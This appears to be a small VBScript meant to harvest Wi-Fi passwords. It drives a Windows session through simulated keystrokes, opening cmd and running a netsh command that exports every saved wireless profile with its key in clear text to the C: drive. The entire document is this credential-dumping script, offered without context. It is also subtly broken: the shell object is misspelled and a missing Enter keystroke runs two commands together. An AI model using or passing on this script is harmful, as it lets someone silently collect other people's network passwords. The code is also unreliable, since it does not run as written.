set c=createobject("wscripy.shell")

c.sendkeys "^"+"{ESC}"
wscript.sleep 1000
c.sendkeys "cmd"
wscript.sleep 1000
c.sendkeys "{ENTER}"
wscript.sleep 1000
c.sendkeys "netsh wlan export profile folder = c:/ key = clear"
c.sendkeys "exit"
wscript.sleep 1000
c.sendkeys "^"+"{ESC}"
wscript.sleep 1000
c.sendkeys "file"
wscript.sleep 1000
c.sendkeys "{ENTER}"
